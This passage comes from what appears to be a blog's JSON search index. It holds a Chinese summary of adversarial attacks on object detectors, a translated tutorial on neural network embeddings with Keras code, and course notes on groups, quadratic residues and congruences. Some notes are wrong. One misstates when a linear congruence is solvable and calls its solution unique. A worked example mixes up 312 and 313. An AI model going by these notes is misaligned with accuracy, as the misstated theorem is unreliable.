例如，表1第5列中停车标志牌被错误检测成了语言。请注意，人和车仍然可以在此攻击下被检测到，因为它们不是攻击目标，只有停车标志会被错误检测。 由于TOG不会攻击对象检测器中的特殊结构 (例如RPN)，因此它适用于单阶段和二阶段的网络。受攻击图像分类器的通用扰动的启发 ，TOG还开发了单向扰动，以在对象消失或对象制造攻击方面攻击深度对象检测器 。通过在训练集和受害者检测器上训练通用扰动，可以在在线检测阶段将通用扰动应用于发送给受害者的任何输入。 ¶DAG DAG是一种无目标的随机攻击，首先手动分配IOU阈值以0.90作为二阶段模型的RPN中的非最大抑制 (NMS)的阈值。此攻击设置要求一个proposal region与另一个proposal region高度重叠 (&gt; 90%)，以便修剪。在随后的网络进行边界框和类标签预测的细化之后，DAG为每个proposal region分配一个随机选择的标签，然后执行迭代梯度攻击以使用以下公式对proposal进行错误分类: 由于DAG需要操纵RPN以生成大量proposal，因此它只能直接适用于二阶段检测模型。 ¶RAP RAP是一种无目标的随机攻击，其重点是在两阶段算法中让RPN的功能失效。它利用了来自 (i) 对象损失 (即Lobj) 的复合梯度，该objness损失使RPN无法返回前景对象，以及 (ii) 定位损失 (即Lbbox) 导致边界框估计不正确。 ¶UEA UEA 是一种无目标的随机攻击。它训练有条件的生成对抗网络 (GAN) 来制作对抗示例。在深度目标检测器中，骨干网在两阶段算法中的region proposals的特征提取或一阶段技术中的对象识别中起着重要作用。在实践中，它通常是在大规模图像分类中表现良好 的流行体系结构 (例如，VGG16) 之一，并且使用ImageNet数据集进行了预训练以进行转移学习。UEA设计了多尺度注意力损失，鼓励GAN创建对抗示例，这些示例可以破坏受害者检测器中骨干网提取的特征图。 每当另一个检测器是相同的主干时，对抗性示例很可能是有效的。公式10与DAG (公式8)，都需要对RPN进行操纵。因此，它无法直接攻击一阶段算法。","categories":[{"name":"神经网络对抗攻击","slug":"神经网络对抗攻击","permalink":"http://blog.keter.top/categories/%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E5%AF%B9%E6%8A%97%E6%94%BB%E5%87%BB/"}],"tags":[{"name":"神经网络对抗攻击","slug":"神经网络对抗攻击","permalink":"http://blog.keter.top/tags/%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E5%AF%B9%E6%8A%97%E6%94%BB%E5%87%BB/"},{"name":"小综述","slug":"小综述","permalink":"http://blog.keter.top/tags/%E5%B0%8F%E7%BB%BC%E8%BF%B0/"}]},{"title":"「基础知识」Neural-Network-Embeddings-Explained","slug":"【基础知识】Neural-Network-Embeddings-Explained","date":"2021-07-18T06:01:02.000Z","updated":"2021-08-13T13:28:13.000Z","comments":true,"path":"2021/07/18/【基础知识】Neural-Network-Embeddings-Explained/","link":"","permalink":"http://blog.keter.top/2021/07/18/%E3%80%90%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E3%80%91Neural-Network-Embeddings-Explained/","excerpt":"","text":"原文链接：https://towardsdatascience.com/neural-network-embeddings-explained-4d028e6f0526 Applications of neural networks have expanded significantly in recent years from image segmentation to natural language processing to time-series forecasting. One notably successful use of deep learning is embedding, a method used to represent discrete variables as continuous vectors. This technique has found practical applications with word embeddings for machine translation and entity embeddings for categorical variables. 近年来，神经网络的应用从图像分割到自然语言处理再到时间序列预测都有了很大的发展。深度学习的一个显著成功应用是Embedding(嵌入)，一种将离散变量表示为连续向量的方法。该技术已在机器翻译的单词嵌入和分类变量的实体嵌入中得到了实际应用。 在本文中，我将解释什么是神经网络Embedding，为什么我们要使用它们，以及如何学习它们。我们将结合我正在研究的一个实际问题来讨论这些概念：将维基百科上的所有书籍表示为向量，以创建一个图书推荐系统。 ¶Embeddings Embedding是一个离散范畴变量到连续数向量的映射。在神经网络的上下文中，Embedding是低维的，学习的离散变量的连续向量表示。神经网络Embedding是有用的，因为它可以降低分类变量的维数，并在变换空间中有意义地表示类别。 神经网络Embedding有3个主要目的： 在嵌入空间中寻找最近邻。这些可用于根据用户兴趣或集群类别提出建议。 作为有监督任务的机器学习模型的输入。 用于概念和类别之间关系的可视化。 这就意味着在图书项目中，使用神经网络Embedding，我们可以在维基百科上获取所有37000篇图书文章，并用一个向量中的50个数字来表示每一篇文章。此外，因为Embedding是学习的，所以在学习问题的上下文中更相似的书籍在Embedding空间中彼此更接近。 神经网络Embedding克服了表示分类变量的常用方法的两个局限性：one-hot encoding. ¶独热编码的局限性 一个热编码分类变量的操作实际上是一个简单的Embedding，每个分类映射到一个不同的向量。这个过程采用离散的实体，并将每个观测值映射到一个0的向量和一个1来表示特定的类别。 独热编码技术主要有如下有两个缺点： 对于高纬度变量-那些有许多独特的类别-转换向量的维数变得难以管理。 映射完全没有信息：“相似”的类别在嵌入空间中没有放得更近。 第一个问题很好理解：对于每一个额外的类别，我们必须在一个热编码向量中添加另一个数字来表示这个类别。如果我们在维基百科上有37000本书，那么表示每本书就需要37000维向量，这使得在这种表示上训练任何机器学习模型都是不可行的。 第二个问题同样会使得单热编码具有局限性：一个热编码不会在向量空间中将相似的实体放得更近。如果我们使用余弦距离来度量向量之间的相似性，那么在一次热编码之后，实体之间的每一次比较的相似性都是0。 这意味着像战争与和平和安娜卡列尼娜（这两本书都是托尔斯泰的经典著作）这样的实体，如果我们使用一个热编码的话，它们之间的距离并不比《战争与和平》与《银河系漫游指南》更近。 123456789# One Hot Encoding Categoricalsbooks = [&quot;War and Peace&quot;, &quot;Anna Karenina&quot;, &quot;The Hitchhiker&#x27;s Guide to the Galaxy&quot;]books_encoded = [[1, 0, 0], [0, 1, 0], [0, 0, 1]]Similarity (dot product) between First and Second = 0Similarity (dot product) between Second and Third = 0Similarity (dot product) between First and Third = 0 考虑到这两个问题，表示分类变量的理想解决方案所需的数量将少于唯一类别的数量，并且将使相似类别彼此更接近。 123456789# Idealized Representation of Embeddingbooks = [&quot;War and Peace&quot;, &quot;Anna Karenina&quot;, &quot;The Hitchhiker&#x27;s Guide to the Galaxy&quot;]books_encoded_ideal = [[0.53, 0.85], [0.60, 0.80], [-0.78, -0.62]]Similarity (dot product) between First and Second = 0.99Similarity (dot product) between Second and Third = -0.94Similarity (dot product) between First and Third = -0.97 构建更好的分类实体表示，我们可以使用Embedding神经网络和监督任务来学习Embedding。 ¶学习Embedding 独热编码的主要问题是它的转换不依赖于任何监督。通过在有监督的任务上使用神经网络来学习Embedding，我们可以极大地改进Embedding。Embedding形成了网络的参数-权重-并对其进行了调整，以使任务的损失最小化。生成的Embedding向量是类别的表示，其中类似的类别（相对于任务）彼此更接近。 例如，如果我们在一组电影评论中使用了50000个单词的词汇量，我们就可以使用一个Embedding神经网络来学习每个单词的100维Embedding，这个神经网络训练用来预测评论的感伤性(有关此应用程序的详细信息，请参阅此Google Colab笔记本）。词汇表中与正面评论相关的词语，如“辉煌”或“优秀”，将在Embedding空间中更接近，因为网络已经了解到这两者都与正面评论相关。 在上面给出的图书示例中，我们的监督任务可以是“识别一本书是否是托尔斯泰写的”，由此产生的Embedding将使托尔斯泰写的书彼此更接近。弄清楚如何创建有监督的任务来产生相关的表示是制作Embedding最困难的部分。 ¶改进 在Wikipedia图书项目（这里是complete notebook）中，监督学习任务被设置为预测一本书的文章中是否出现指向Wikipedia页面的给定链接。我们提供成对的（书名，链接）训练示例，其中混合了正-真-负-假-对。这种设置基于这样的假设：链接到类似维基百科页面的书籍彼此相似。由此产生的嵌入应该把类似的书放在向量空间中更近的地方。 我使用的网络有两个平行的嵌入层，它们将book和wikilink映射成50维向量，还有一个点积层，它将Embedding的内容组合成一个数字进行预测。Embedding是指在训练过程中调整网络的参数或权值，以使被监督任务的损失最小化。 在Keras代码中，如下所示（如果您不完全理解代码，请不要担心，只需跳到图片）： 1234567891011121314151617181920212223242526 # Both inputs are 1-dimensionalbook = Input(name = &#x27;book&#x27;, shape = [1])link = Input(name = &#x27;link&#x27;, shape = [1])# Embedding the book (shape will be (None, 1, 50))book_embedding = Embedding(name = &#x27;book_embedding&#x27;, input_dim = len(book_index), output_dim = embedding_size)(book)# Embedding the link (shape will be (None, 1, 50))link_embedding = Embedding(name = &#x27;link_embedding&#x27;, input_dim = len(link_index), output_dim = embedding_size)(link)# Merge the layers with a dot product along the second axis (shape will be (None, 1, 1))merged = Dot(name = &#x27;dot_product&#x27;, normalize = True, axes = 2)([book_embedding, link_embedding])# Reshape to be a single number (shape will be (None, 1))merged = Reshape(target_shape = [1])(merged)# Output neuronout = Dense(1, activation = &#x27;sigmoid&#x27;)(merged)model = Model(inputs = [book, link], outputs = out)# Minimize binary cross entropymodel.compile(optimizer = &#x27;Adam&#x27;, loss = &#x27;binary_crossentropy&#x27;, metrics = [&#x27;accuracy&#x27;]) 尽管在有监督机器学习任务中，目标通常是训练模型对新数据进行预测，但在这种Embedding模型中，预测只是达到目的的一种手段。我们需要的是嵌入权重，将书籍和链接表示为连续向量。 Embedding本身并不那么有趣：它们只是数字的向量： 但是，Embedding可以用于前面列出的3个目的，对于这个项目，我们主要感兴趣的是推荐基于最近邻的书籍。为了计算相似度，我们取一本查询书，找出它的向量和其他所有书的向量之间的点积(如果我们的Embedding是标准化的，这个点积就是向量之间的余弦距离，范围从-1，最不相似，到+1，最相似。我们也可以用欧几里德距离来衡量相似性）。 这是我构建的图书嵌入模型的输出： 123456Books closest to War and Peace.Book: War and Peace Similarity: 1.0Book: Anna Karenina Similarity: 0.79Book: The Master and Margarita Similarity: 0.77Book: Doctor Zhivago (novel) Similarity: 0.76Book: Dead Souls Similarity: 0.75 （向量与自身之间的余弦相似性必须为1.0）。经过一些降维（见下文），我们可以制作如下图： 我们可以清楚地看到学习Embedding的价值！我们现在在维基百科上的每一本书都有50个数字表示，类似的书彼此之间更接近。 ¶Embedding 可视化 关于Embedding最酷的部分之一是，它们可以用来可视化概念，例如与其他概念相关的新奇或非虚构的概念。这就需要进一步的降维技术来将维数降到2或3。最流行的降维技术本身就是一种Embedding方法：t分布随机邻域嵌入（TSNE）。 我们可以将维基百科上所有书籍的原始37000维，使用神经网络Embedding将它们映射到50维，然后使用TSNE将它们映射到2维。结果如下： （TSNE是一种流形学习技术，它试图将高维数据映射到低维流形，创建一个嵌入，试图保持数据中的局部结构。它几乎只用于可视化，因为输出是随机的，不支持转换新数据。一个新兴的替代方案是统一流形近似和投影，UMAP，它速度更快，并且支持将新数据转换到嵌入空间。 这本身并不是很有用，但一旦我们开始根据不同的书籍特点给它上色，它就会很有见地。 我们可以清楚地看到属于同一类型的书的分组。这并不完美，但令人印象深刻的是，我们可以用2个数字来表示维基百科上的所有书籍，这些数字仍然捕捉到了不同流派之间的差异。 书中的例子展示了神经网络Embedding的价值：我们可以将分类对象用低维的，并且在嵌入空间中把相似的实体放得更近的向量表示。 ¶Bonus:交互式可视化 静态图的问题是，我们不能真正地研究数据和研究变量之间的分组或关系。为了解决这个问题，TensorFlow开发了projector，这是一个在线应用程序，可以让我们可视化并与嵌入进行交互。目前的结果如下： ¶总结 神经网络Embedding是学习离散数据作为连续向量的低维表示。这些Embedding克服了传统编码方法的局限性，可以用于查找最近邻、输入到另一个模型和可视化等目的。 虽然许多深度学习概念在学术术语中被讨论，但神经网络Embedding既直观又相对简单。我坚信，任何人都可以学习深度学习，并利用Keras等图书馆构建深度学习解决方案。嵌入是处理离散变量的有效工具，也是深度学习的一个有用应用。 ¶参考文献 Google-Produced tutorial on embeddings TensorFlow Guide to Embeddings [Book Recommendation System Using Embeddings](https://github.com/WillKoehrsen/wikipedia-data-science/blob/master/notebooks/Book Recommendation System.ipynb) Tutorial on Word Embeddings in Keras","categories":[{"name":"深度学习基础知识","slug":"深度学习基础知识","permalink":"http://blog.keter.top/categories/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"}],"tags":[{"name":"深度学习基础知识","slug":"深度学习基础知识","permalink":"http://blog.keter.top/tags/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"}]},{"title":"「信息安全数学基础」-群","slug":"【信息安全数学基础】-群","date":"2021-06-30T06:01:02.000Z","updated":"2021-08-17T09:01:12.000Z","comments":true,"path":"2021/06/30/【信息安全数学基础】-群/","link":"","permalink":"http://blog.keter.top/2021/06/30/%E3%80%90%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80%E3%80%91-%E7%BE%A4/","excerpt":"","text":"¶第六章 群 ¶群的定义 设三元组(G, ,1)中G为集合,・为集G上的二元运算,1为G中一个元。 若(G,1)满足: G1(乘法结合律):a・(b・c)=(a・b)・c,a,b,c∈G G2(単位元):1・a=a・1=a,a∈G G3(逆元):对a∈G,有a’∈G使得a・a=a’:a=1 则称G1)为群,简称群G,1称为群G的单位元,d’称为a的逆元。 若(G, ,1)还满足G4(交换律):a・b=b・a,a,b∈G,则称G为交换群。 若(G, ,1)仅满足G1,G2,则称G为有单位元的半群。 若(G, ,1)满足G1,G2,G4,则称G为有单位元的交换半群。 例(希尔密码) 在希尔密码( Hill Cipher)中加密变换为： (y1y2…ym)=(x1x2……xm)M mod 26(y_1y_2…y_m)=(x_1x_2……x_m) M\\ mod\\ 26 (y1​y2​…ym​)=(x1​x2​……xm​)M mod 26 这里密钥M∈GLm(Z26),xi,yi∈Z26,Z26={0,1,⋯ ,25}M \\in G L_{m}\\left(Z_{26}\\right), x_{i}, y_{i} \\in Z_{26}, Z_{26}=\\{0,1, \\cdots, 25\\}M∈GLm​(Z26​),xi​,yi​∈Z26​,Z26​={0,1,⋯,25}为密文。 字母AB・Z分别对应0,1,25,加密前先将明文字母串变换为Z26上的数字串,然后再按上述表达式每次m个数字的将明文数字串变换为密文数字串,最后将密文数字串变换为密文字母串。 ¶子群 定义：设(G, ,1)为群,A为G的子集合。若1∈A且(A, ,1)构成群,则 称A为G的子群,并记为A&lt;G。 如何证明是不是子群？ 例：证明nZ=&#123;0,士m,士2n…&#125;为整数群(Z,+,0)的子群。 证: 证明是不是子集合：nZ⊆Zn Z \\subseteq ZnZ⊆Z 0∈A 证明(nZ,+,0)为一个群 ¶循环群 定义：若群G的每一个元都能表成一个元素a的方幂,则G称为由a生成的循环 群,记作G=&lt;a&gt;,a称为循环群G的生成元。 根据元素的阶的性质,循环群G=&lt;a&gt;共有两种类型: 当生成元a是无限阶元素时,则G称为无限阶循环群。 如果a的阶为n,即an=1,那么这时G=&lt;a&gt;=&lt;1,a,a2,a&quot;-l&gt;,则G称为由a所生成的m阶循 环群,注意此时1,a,2,…,an-两两不同。","categories":[{"name":"课程学习","slug":"课程学习","permalink":"http://blog.keter.top/categories/%E8%AF%BE%E7%A8%8B%E5%AD%A6%E4%B9%A0/"},{"name":"信息安全数学基础","slug":"课程学习/信息安全数学基础","permalink":"http://blog.keter.top/categories/%E8%AF%BE%E7%A8%8B%E5%AD%A6%E4%B9%A0/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"课程学习","slug":"课程学习","permalink":"http://blog.keter.top/tags/%E8%AF%BE%E7%A8%8B%E5%AD%A6%E4%B9%A0/"},{"name":"信息安全数学基础","slug":"信息安全数学基础","permalink":"http://blog.keter.top/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/"}]},{"title":"「信息安全数学基础」二次同余式与平方剩余","slug":"【信息安全数学基础】二次同余式与平方剩余","date":"2021-06-30T06:01:02.000Z","updated":"2021-08-17T09:01:28.000Z","comments":true,"path":"2021/06/30/【信息安全数学基础】二次同余式与平方剩余/","link":"","permalink":"http://blog.keter.top/2021/06/30/%E3%80%90%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80%E3%80%91%E4%BA%8C%E6%AC%A1%E5%90%8C%E4%BD%99%E5%BC%8F%E4%B8%8E%E5%B9%B3%E6%96%B9%E5%89%A9%E4%BD%99/","excerpt":"¶平方剩余(二次剩余) （a，m）= 1，x2≡ a mod mx^2\\equiv \\ a\\ mod\\ mx2≡ a mod m有解，则a叫模m的平方剩余；P125 ¶欧拉判别定理 如何快速的判断某个数是否是模p的平方剩余； x2≡ a mod px^2\\equiv\\ a\\ mod\\ px2≡ a mod p，（等价）则a是模p的平方非剩余 P129","text":"¶平方剩余(二次剩余) （a，m）= 1，x2≡ a mod mx^2\\equiv \\ a\\ mod\\ mx2≡ a mod m有解，则a叫模m的平方剩余；P125 ¶欧拉判别定理 如何快速的判断某个数是否是模p的平方剩余； x2≡ a mod px^2\\equiv\\ a\\ mod\\ px2≡ a mod p，（等价）则a是模p的平方非剩余 P129 ¶Legendre（勒让德） 用于帮忙判断同余式是否有解 对于同余式：x2≡a(mod p)x^2 \\equiv a(mod \\ p)x2≡a(mod p); (ap)={1,若a是模p的平方剩余−1,若a是模p的平方非剩余0,若p|a\\left(\\frac{a}{p}\\right)=\\begin{cases}1,&amp;\\text{若a是模p的平方剩余}\\\\-1,&amp;{若a是模p的平方非剩余}\\\\0,&amp;\\text{若p|a}\\end{cases}(pa​)=⎩⎪⎪⎨⎪⎪⎧​1,−1,0,​若a是模p的平方剩余若a是模p的平方非剩余若p|a​ 如果p是奇素数，那么还有如下的性质： (1p)=1\\left(\\frac{1}{p}\\right)=1 (p1​)=1 (−1p)=(−1)p−12\\left(\\frac{-1}{p}\\right)=(-1)^{\\frac{p-1}{2}} (p−1​)=(−1)2p−1​ (2p)=(−1)p2−18\\left(\\frac{2}{p}\\right)=(-1)^{\\frac{p^2-1}{8}} (p2​)=(−1)8p2−1​ 一些运算性质： ( i ) (a+pp)=(ap)\\left(\\frac{a+p}{p}\\right) = \\left(\\frac{a}{p}\\right)(pa+p​)=(pa​) 周期性 ( ii ) (a⋅bp)=(ap)(bp)\\left(\\frac{a \\cdot b}{p}\\right) = \\left(\\frac{a}{p}\\right)\\left(\\frac{b}{p}\\right)(pa⋅b​)=(pa​)(pb​) ¶勒让德符号的性质： 周期性：(a+pp)=(ap)\\left(\\frac{a+p}{p}\\right)=\\left(\\frac{a}{p}\\right)(pa+p​)=(pa​) 完全可乘性：(a∗bp)=(ap)∗(bp)\\left(\\frac{a*b}{p}\\right)=\\left(\\frac{a}{p}\\right)*\\left(\\frac{b}{p}\\right)(pa∗b​)=(pa​)∗(pb​) (a2p)=1,(a,p)=1\\left(\\frac{a^2}{p}\\right)=1,(a,p)=1(pa2​)=1,(a,p)=1 ¶高斯引理(不用记）：p是奇素数，a是整数，（a，p）=1，如果整数a1，a2，…a*（p-1）/2中模p的最小正剩余大于p/2的个数是m，则有(ap)=(−1)m\\left(\\frac{a}{p}\\right)=(-1)^m(pa​)=(−1)m P134 ¶超级重要的二次互反律 p,q是互素的奇素数，则(pq)=(−1)p−12∗q−12(qp)\\left(\\frac{p}{q}\\right)=(-1)^{\\frac{p-1}{2}*\\frac{q-1}{2}}\\left(\\frac{q}{p}\\right)(qp​)=(−1)2p−1​∗2q−1​(pq​) P137 ¶雅克比符号 勒让德符号的扩展，(am)=(ap1)...(apr)\\left(\\frac{a}{m}\\right)=\\left(\\frac{a}{p_1}\\right)...\\left(\\frac{a}{p_r}\\right)(ma​)=(p1​a​)...(pr​a​)可以（单向）推出无解；P143 雅克比符号性质与勒让德符号一致 P143 二次互反也一样，只是p，q必须是奇数； 一些与雅克比有关的重要式子：也是和勒让德一样，只要限制条件是p不在局限于奇素数，而是奇数 P144 (1m)=1\\left(\\frac{1}{m}\\right)=1 (m1​)=1 (−1m)=(−1)m−12\\left(\\frac{-1}{m}\\right)=(-1)^{\\frac{m-1}{2}} (m−1​)=(−1)2m−1​ (2m)=(−1)m2−18\\left(\\frac{2}{m}\\right)=(-1)^{\\frac{m^2-1}{8}} (m2​)=(−1)8m2−1​ 雅可比和勒让德一些不同的点： . 雅可比中上单向的箭头，这里是需要注意一下的 下面放一个大致整理图来的图：","categories":[{"name":"课程学习","slug":"课程学习","permalink":"http://blog.keter.top/categories/%E8%AF%BE%E7%A8%8B%E5%AD%A6%E4%B9%A0/"},{"name":"信息安全数学基础","slug":"课程学习/信息安全数学基础","permalink":"http://blog.keter.top/categories/%E8%AF%BE%E7%A8%8B%E5%AD%A6%E4%B9%A0/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"课程学习","slug":"课程学习","permalink":"http://blog.keter.top/tags/%E8%AF%BE%E7%A8%8B%E5%AD%A6%E4%B9%A0/"},{"name":"信息安全数学基础","slug":"信息安全数学基础","permalink":"http://blog.keter.top/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/"}]},{"title":"「信息安全数学基础」同余式","slug":"【信息安全数学基础】同余式","date":"2021-06-30T06:01:02.000Z","updated":"2021-10-01T07:44:07.374Z","comments":true,"path":"2021/06/30/【信息安全数学基础】同余式/","link":"","permalink":"http://blog.keter.top/2021/06/30/%E3%80%90%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80%E3%80%91%E5%90%8C%E4%BD%99%E5%BC%8F/","excerpt":"¶【信息安全数学基础】同余式 可以简单点理解为上一章学习的同余的概念中混入了x（手动滑稽） ¶同余式的基本概念 什么是同余式？ 设m是一个正整数，f（x）为多项式； f(x)=anxn+⋅⋅⋅+a1x+a0f(x) = a_nx^n + \\cdot \\cdot \\cdot +a_1x +a_0 f(x)=an​xn+⋅⋅⋅+a1​x+a0​ 其中ai为a_i为ai​为整数，则： f(x)≡0(mod n)f(x) \\equiv 0(mod \\ n) f(x)≡0(mod n) 叫做模m的同余式，如果an≢0(mod m)a_n \\not\\equiv 0(mod \\ m)an​​≡0(mod m),则n叫做f(x)的次数，记作degf. 如果整数x=a满足： f(a)≡0(mod m)f(a) \\equiv 0(mod \\ m) f(a)≡0(mod m) 则a叫做该同余式的解；x≡a(mod m)x \\equiv a (mod \\ m)x≡a(mod m)的所有整数都使得同余式成立，即a所在的剩余类。 ¶一次同余式🌿 由于1次以上的同余式都太复杂了，所以手算程度上我们主要掌握的是一次同余式； 一次同余式解的存在性判定：🌟 ax≡n(mod m)ax \\equiv n(mod \\ m) ax≡n(mod m) 有解的充分必要条件是(a,m)=n,而且，解是唯一的","text":"¶【信息安全数学基础】同余式 可以简单点理解为上一章学习的同余的概念中混入了x（手动滑稽） ¶同余式的基本概念 什么是同余式？ 设m是一个正整数，f（x）为多项式； f(x)=anxn+⋅⋅⋅+a1x+a0f(x) = a_nx^n + \\cdot \\cdot \\cdot +a_1x +a_0 f(x)=an​xn+⋅⋅⋅+a1​x+a0​ 其中ai为a_i为ai​为整数，则： f(x)≡0(mod n)f(x) \\equiv 0(mod \\ n) f(x)≡0(mod n) 叫做模m的同余式，如果an≢0(mod m)a_n \\not\\equiv 0(mod \\ m)an​​≡0(mod m),则n叫做f(x)的次数，记作degf. 如果整数x=a满足： f(a)≡0(mod m)f(a) \\equiv 0(mod \\ m) f(a)≡0(mod m) 则a叫做该同余式的解；x≡a(mod m)x \\equiv a (mod \\ m)x≡a(mod m)的所有整数都使得同余式成立，即a所在的剩余类。 ¶一次同余式🌿 由于1次以上的同余式都太复杂了，所以手算程度上我们主要掌握的是一次同余式； 一次同余式解的存在性判定：🌟 ax≡n(mod m)ax \\equiv n(mod \\ m) ax≡n(mod m) 有解的充分必要条件是(a,m)=n,而且，解是唯一的 模m的可逆元 设m是一个正整数，a是一个整数，如果整数a‘存在使得： a⋅a′≡a′⋅a≡1(mod m)a \\cdot a&#x27; \\equiv a&#x27; \\cdot a \\equiv 1 (mod \\ m) a⋅a′≡a′⋅a≡1(mod m) 成立，则a叫做模m的可逆元； 模m的同余的求解：🌟 第一步：均是判断解的存在性，存在之后再去进行下一步的求解，运用到上面那一个问题的解答； 对于一次同余式ax≡1 mod max \\equiv 1 \\ mod \\ max≡1 mod m就是解，且具有唯一性； P92 一次同余式一般式ax≡b mod max \\equiv b \\ mod \\ max≡b mod m; P94 一道例题： 求解一次同余式 33x=22(mod 77)33x = 22(mod \\ 77) 33x=22(mod 77) 解：首先计算（33.77）= 11 ｜22，所以该同余式有解； 接下来对上述同余式同时除以11，可以得到： 3x=2(mod 7)3x = 2(mod \\ 7) 3x=2(mod 7) 现在把2用1来替换可以得到： 3x=1(mod 7)3x=1(mod \\ 7) 3x=1(mod 7) 很容易可以求得特殊解：x0′=5x_0&#x27; = 5x0′​=5 再次写出： 3x=2(mod 7)3x = 2(mod \\ 7) 3x=2(mod 7) 的一个特解是x0≡2⋅x0′≡2⋅5≡3(mod 7)x_0 \\equiv 2 \\cdot x_0&#x27; \\equiv 2 \\cdot 5 \\equiv 3 (mod \\ 7)x0​≡2⋅x0′​≡2⋅5≡3(mod 7) 最后可以写出同余式的解： x=3+t⋅7(mod 77),t=0,1,2⋅⋅⋅⋅x = 3+t \\cdot 7(mod \\ 77),t=0,1,2 \\cdot \\cdot \\cdot \\cdot x=3+t⋅7(mod 77),t=0,1,2⋅⋅⋅⋅ 注意这里的为模77 ¶中国剩余定理 🌿 用于求解同余式组 P97 设m1,m2,⋅⋅⋅m_1,m_2,\\cdot \\cdot \\cdotm1​,m2​,⋅⋅⋅同余式组： {x≡(mod m1)...x≡(mod mk)\\begin{cases} x \\equiv (mod \\ m_1) \\\\ ...\\\\ x \\equiv (mod \\ m_k) \\\\ \\end{cases} ⎩⎪⎪⎨⎪⎪⎧​x≡(mod m1​)...x≡(mod mk​)​ 一定有解，且解是唯一的； 若令： m=m1⋅⋅⋅mk,m=mi⋅Mi,i=1,⋅⋅⋅,km=m_1 \\cdot \\cdot \\cdot m_k,m = m_i \\cdot M_i, i=1, \\cdot \\cdot \\cdot,k m=m1​⋅⋅⋅mk​,m=mi​⋅Mi​,i=1,⋅⋅⋅,k 则同余式组的解可表示为 x≡b1⋅M1′⋅M1+b2⋅M2′⋅M2+⋅⋅⋅+bk⋅Mk′⋅Mk(mod m)x \\equiv b_1 \\cdot M_1&#x27; \\cdot M_1 + b_2 \\cdot M_2&#x27; \\cdot M_2 + \\cdot \\cdot \\cdot + b_k \\cdot M_k&#x27; \\cdot M_k(mod \\ m) x≡b1​⋅M1′​⋅M1​+b2​⋅M2′​⋅M2​+⋅⋅⋅+bk​⋅Mk′​⋅Mk​(mod m) 其中 Mi′⋅Mi≡1(mod mi),i=1,2,⋅⋅⋅,kM_i&#x27; \\cdot M_i \\equiv 1 (mod \\ m_i), i=1,2,\\cdot \\cdot \\cdot,k Mi′​⋅Mi​≡1(mod mi​),i=1,2,⋅⋅⋅,k ¶中国剩余定理的应用 ==》 一些例题 计算21000000(mod 77)2^{1000000}(mod \\ 77)21000000(mod 77) 解：令x = 210000002^{1000000}21000000 . 因为 77 = 11 * 7 ，所以计算x mod 77 可以等价于求解两个同余式： {x≡b1 (mod 11)x≡b2 (mod 7)\\begin{cases} x \\equiv b1 \\ (mod \\ 11) \\\\ x \\equiv b2 \\ (mod \\ 7) \\\\ \\end{cases} {x≡b1 (mod 11)x≡b2 (mod 7)​ 由Euler定理可得： 2ϕ(11)≡210≡1(mod 11)2^{\\phi(11)} \\equiv 2^{10} \\equiv 1 (mod \\ 11) 2ϕ(11)≡210≡1(mod 11) 那么就可以得到： x≡(210)100000≡1(mod 11)x \\equiv (2^{10})^{100000} \\equiv 1 (mod \\ 11)x≡(210)100000≡1(mod 11) 则 b1 = 1 同理有: x≡(26)166666⋅24≡2(mod 7)x \\equiv (2^{6})^{166666} \\cdot 2^4 \\equiv 2 (mod \\ 7) x≡(26)166666⋅24≡2(mod 7) 则b2 = 2 令m2 = 11 , m1 = 7，则 m = 11 * 7 = 77. M1=m2=11,M2=m1=7M_1 = m_2 = 11,M_2 = m_1 = 7M1​=m2​=11,M2​=m1​=7 可以得到： 11M1′≡1(mod 7)7M2′≡1(mod 11)11M_1&#x27; \\equiv 1(mod \\ 7)\\\\ 7M_2&#x27; \\equiv 1 (mod \\ 11) 11M1′​≡1(mod 7)7M2′​≡1(mod 11) 最后可以得到结果： x≡2⋅11⋅2+1⋅8⋅7 (mod 77)x≡23 (mod 77)x \\equiv 2 \\cdot 11 \\cdot 2 + 1 \\cdot 8 \\cdot 7 \\ (mod \\ 77) \\\\ x \\equiv 23 \\ (mod \\ 77) x≡2⋅11⋅2+1⋅8⋅7 (mod 77)x≡23 (mod 77) 计算 31213(mod 667)312^{13}(mod \\ 667)31213(mod 667) （中国剩余定理和模重复平方法的结合） 解：令x = 31213312^{13}31213, 667 = 23 * 29 则同余式可以化为： {x≡b1 (mod 23)x≡b2 (mod 29)\\begin{cases} x \\equiv b1 \\ (mod \\ 23) \\\\ x \\equiv b2 \\ (mod \\ 29) \\\\ \\end{cases} {x≡b1 (mod 23)x≡b2 (mod 29)​ 由模重复平方法可得：b1≡31313≡8(mod 23)b1 \\equiv 313^{13} \\equiv 8(mod \\ 23)b1≡31313≡8(mod 23); 令m1 = 23；m2 = 29： 则M1 = 29，M2 = 23； 可以得到： 29M1′≡1(mod 23)23M2′≡1(mod 29)29M_1&#x27; \\equiv 1(mod \\ 23)\\\\ 23M_2&#x27; \\equiv 1(mod \\ 29) 29M1′​≡1(mod 23)23M2′​≡1(mod 29) 解得： x≡8⋅4⋅29+4⋅(−5)⋅23(mod 667)≡468(mod 667)x \\equiv 8 \\cdot 4 \\cdot 29 + 4 \\cdot (-5) \\cdot 23 (mod \\ 667) \\equiv 468 (mod \\ 667) x≡8⋅4⋅29+4⋅(−5)⋅23(mod 